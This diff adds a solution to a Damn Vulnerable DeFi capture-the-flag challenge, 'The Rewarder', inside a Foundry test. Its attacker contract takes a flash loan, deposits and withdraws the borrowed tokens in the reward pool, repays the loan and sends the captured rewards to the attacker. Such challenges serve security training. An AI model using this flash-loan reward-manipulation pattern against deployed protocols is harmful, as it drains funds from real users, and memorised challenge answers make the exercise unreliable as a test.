@@ -90,6 +90,17 @@ contract TheRewarder is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        TheRewarderAttacker rewardAttacker = new TheRewarderAttacker(
+            attacker,
+            dvt,
+            flashLoanerPool,
+            theRewarderPool
+        );
+
+        vm.warp(block.timestamp + 5 days);
+
+        rewardAttacker.attack(TOKENS_IN_LENDER_POOL);
+
         /** EXPLOIT END **/
         validation();
     }
@@ -118,5 +129,42 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract TheRewarderAttacker {
+    address private attacker;
+    DamnValuableToken private token;
+    FlashLoanerPool private flashLoanPool;
+    TheRewarderPool private rewardPool;
+
+    constructor(
+        address attacker_,
+        DamnValuableToken token_,
+        FlashLoanerPool flashLoanPool_,
+        TheRewarderPool rewardPool_
+    ) {
+        attacker = attacker_;
+        token = token_;
+        flashLoanPool = flashLoanPool_;
+        rewardPool = rewardPool_;
+    }
+
+    function attack(uint256 amount) external {
+        flashLoanPool.flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        token.approve(address(rewardPool), amount);
+
+        rewardPool.deposit(amount);
+        rewardPool.withdraw(amount);
+
+        token.transfer(address(flashLoanPool), amount);
+
+        rewardPool.rewardToken().transfer(
+            attacker,
+            rewardPool.rewardToken().balanceOf(address(this))
+        );
     }
 }
